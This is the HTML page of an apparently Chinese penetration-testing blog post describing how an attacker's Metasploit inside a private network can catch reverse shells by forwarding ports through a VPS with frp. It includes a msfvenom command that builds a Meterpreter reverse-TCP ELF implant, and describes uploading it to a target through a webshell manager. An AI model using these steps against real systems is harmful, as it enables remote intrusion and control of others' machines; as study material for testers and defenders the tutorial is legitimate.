@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网MSF接收反向shell(突发奇想的实验) | Seven1an's blog</title><meta name="author" content="Seven1an"><meta name="copyright" content="Seven1an"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。 转载请邮件告知！ 免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担 关于处于内网环境的MSF接收反向连接shell​	内网渗透两位主流工具无非cs与msf，CobaltStrike与Metasploit不一样，cs架构的它teamserver直接部署在外网ip上，做攻击使用连接方便，而">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网MSF接收反向shell(突发奇想的实验)">
+<meta property="og:url" content="https://seven1an.github.io/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/index.html">
+<meta property="og:site_name" content="Seven1an&#39;s blog">
+<meta property="og:description" content="注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。 转载请邮件告知！ 免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担 关于处于内网环境的MSF接收反向连接shell​	内网渗透两位主流工具无非cs与msf，CobaltStrike与Metasploit不一样，cs架构的它teamserver直接部署在外网ip上，做攻击使用连接方便，而">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://seven1an.github.io/img/th.png">
+<meta property="article:published_time" content="2022-10-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-20T09:59:12.952Z">
+<meta property="article:author" content="Seven1an">
+<meta property="article:tag" content="Seven1an">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://seven1an.github.io/img/th.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://seven1an.github.io/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/pluginsSrc/@fancyapps/ui/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网MSF接收反向shell(突发奇想的实验)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-20 17:59:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/th.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/172109xGxiM.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Seven1an's blog"><span class="site-name">Seven1an's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网MSF接收反向shell(突发奇想的实验)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2022-10-26T16:00:00.000Z" title="发表于 2022-10-27 00:00:00">2022-10-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p>
+<p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p>
+<h3 id="关于处于内网环境的MSF接收反向连接shell"><a href="#关于处于内网环境的MSF接收反向连接shell" class="headerlink" title="关于处于内网环境的MSF接收反向连接shell"></a>关于处于内网环境的MSF接收反向连接shell</h3><p>​	内网渗透两位主流工具无非cs与msf，CobaltStrike与Metasploit不一样，cs架构的它teamserver直接部署在外网ip上，做攻击使用连接方便，而msf没有。</p>
+<p>​	另一方面，对一部分人来说，这种方法的作用某种情况下确确实实是多余的，可能是我的学习方式跟大家不大相同，<strong>刹那间的突发奇想，自己也就研究了一下</strong>，也是希望能帮助到想到这个问题的小伙伴。</p>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li><p>大家的MSF也几乎都是处于虚拟机中的内网环境，攻击的用处也大都是和cobaltstrike传递shell做后渗透。</p>
+</li>
+<li><p>但是，当我们的<strong>主动攻击</strong>目标是外网机器，或者说是不同且不通的内网环境，<strong>这种情况，我们该如何去接收反向的shell连接</strong>呢。</p>
+<p><strong>网上搜索关于msf教程，也通常都是在内网中做的演示</strong>，但是在<strong>渗透过程中不乏会遇到需要利用msf的exploit进行漏洞利用的过程</strong>，本文应运而生，文章创作目的意在帮助需要的小伙伴。</p>
+</li>
+</ul>
+<h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><p>核心在于流量转发，使用到的工具</p>
+<ul>
+<li>frp</li>
+<li>独立公网IP的vps</li>
+<li>xshell</li>
+<li>蚁剑</li>
+</ul>
+<h5 id="frp配置、"><a href="#frp配置、" class="headerlink" title="frp配置、"></a>frp配置、</h5><p>​	frp的配置，使其可以互通</p>
+<p>​	首先在内网kali和自己的vps上下载好frp，没钱买vps就去用提供端口转发的第三方服务，网上太多了。</p>
+<p><img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/1.png" alt="在这里插入图片描述"></p>
+<p>​	简单配置一下</p>
+<p>​	vps：frps配置</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/2.png" alt="在这里插入图片描述"></p>
+<p>​	内网kali：frpc配置</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/3.png" alt="在这里插入图片描述"></p>
+<p>​	连接vps的7000端口通信，并且把本地的2222端口映射到vps的8000端口</p>
+<p>​	接下来测试一下连通性：</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/4.png" alt="在这里插入图片描述"></p>
+<p>​	连通是成功的</p>
+<p>​	注意：如果遇到ping通可以，但是nc不能通信，大家可以多换一个端口尝试</p>
+<p>​	</p>
+<h5 id="木马生成、"><a href="#木马生成、" class="headerlink" title="木马生成、"></a>木马生成、</h5><p>​	生成msf的木马</p>
+<p>​	最简单的命令生成一个</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=外网IP LPORT=外网端口 -f elf &gt; /test/shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>​	留意这个监听payload：<code>linux/x64/meterpreter/reverse_tcp</code></p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/5.png" alt="在这里插入图片描述"></p>
+<p>​	之后把shell.elf下载到本地，再通过蚁剑上传到目标机器</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/6.png" alt="在这里插入图片描述"></p>
+<p>​	</p>
+<h5 id="流量转发、"><a href="#流量转发、" class="headerlink" title="流量转发、"></a>流量转发、</h5><p>​	启动frp进行流量转发</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/7.png" alt="在这里插入图片描述"></p>
+<h5 id="测试上线、"><a href="#测试上线、" class="headerlink" title="测试上线、"></a>测试上线、</h5><p>​	开启msf的监听，等待上线</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/8.png" alt="在这里插入图片描述"></p>
+<p>​	这个时候注意默认的payload，是跟我们生成木马时使用的不一样，<strong>原则上用什么监听模式生成木马，就用什么监听模式接受反弹shell</strong>，所以要改成一样的。</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/9.png" alt="在这里插入图片描述"></p>
+<p>​	我们选择监听本地，之所以是2222端口，因为我们前面讲到转发的本地端口是2222</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/10.png" alt="在这里插入图片描述"></p>
+<p>​	目标机运行上传的shell.elf</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/11.png" alt="在这里插入图片描述"></p>
+<p>​	成功接收到了shell</p>
+<p>​	<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/12.png" alt="在这里插入图片描述"></p>
+<p>OK 结束</p>
+<p>这是执行载荷去接收shell的案例，其实用执行命令反弹shell的话（比如ms17010），（不只是MSF）还有一些原理和实现方法是一样的，主要是端口转发。</p>
+<h3 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h3></article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/th.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="Ubuntu搭建Socks5代理服务器"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Ubuntu搭建Socks5代理服务器</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/" title="灯塔资产系统（ARL）部署"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">灯塔资产系统（ARL）部署</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/th.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Seven1an</div><div class="author-info__description">一名热爱渗透测试技术的美股交易员</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:2085768450@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: ;"></i></a><a class="social-icon" href="tencent://message/?uin=2085768450&amp;Site=&amp;Menu=yes" target="_blank" title="QQ联系我"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://map.baidu.com/search/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E5%AE%89%E9%83%A8/@12958773.3599388,4825477.5717009,18z?querytype=s&amp;da_src=shareurl&amp;wd=%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E5%AE%89%E9%83%A8&amp;c=270&amp;src=0&amp;wd2=%E5%8C%97%E4%BA%AC%E5%B8%82%E4%B8%9C%E5%9F%8E%E5%8C%BA&amp;pn=0&amp;sug=1&amp;l=18&amp;b=(12439501.56472365,3540894.6436876496;12441037.56472365,3541625.6436876496)&amp;from=webmap&amp;biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&amp;device_ratio=2" target="_blank" title="找到我"><i class="fas fa-map-marker"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">文章如出现错误或有疑问的地方，欢迎联系指出，在下感激不尽，也欢迎技术交流与合作的朋友。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%A4%84%E4%BA%8E%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E7%9A%84MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5shell"><span class="toc-number">1.</span> <span class="toc-text">关于处于内网环境的MSF接收反向连接shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#START"><span class="toc-number">1.2.</span> <span class="toc-text">START</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#frp%E9%85%8D%E7%BD%AE%E3%80%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">frp配置、</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E3%80%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">木马生成、</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E3%80%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">流量转发、</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%B8%8A%E7%BA%BF%E3%80%81"><span class="toc-number">1.2.4.</span> <span class="toc-text">测试上线、</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#end"><span class="toc-number">2.</span> <span class="toc-text">end</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/" title="Springboot之Actuator-heapdump漏洞">Springboot之Actuator-heapdump漏洞</a><time datetime="2024-03-16T16:00:00.000Z" title="发表于 2024-03-17 00:00:00">2024-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="Java命令执行">Java命令执行</a><time datetime="2024-03-10T16:00:00.000Z" title="发表于 2024-03-11 00:00:00">2024-03-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="Ubuntu搭建Socks5代理服务器">Ubuntu搭建Socks5代理服务器</a><time datetime="2022-10-29T16:00:00.000Z" title="发表于 2022-10-30 00:00:00">2022-10-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/" title="内网MSF接收反向shell(突发奇想的实验)">内网MSF接收反向shell(突发奇想的实验)</a><time datetime="2022-10-26T16:00:00.000Z" title="发表于 2022-10-27 00:00:00">2022-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/" title="灯塔资产系统（ARL）部署">灯塔资产系统（ARL）部署</a><time datetime="2021-07-10T16:00:00.000Z" title="发表于 2021-07-11 00:00:00">2021-07-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Seven1an</div><div class="framework-info"><span>❤ I love $BTC ❤</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/pluginsSrc/@fancyapps/ui/dist/fancybox/fancybox.umd.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="/pluginsSrc/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="/pluginsSrc/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
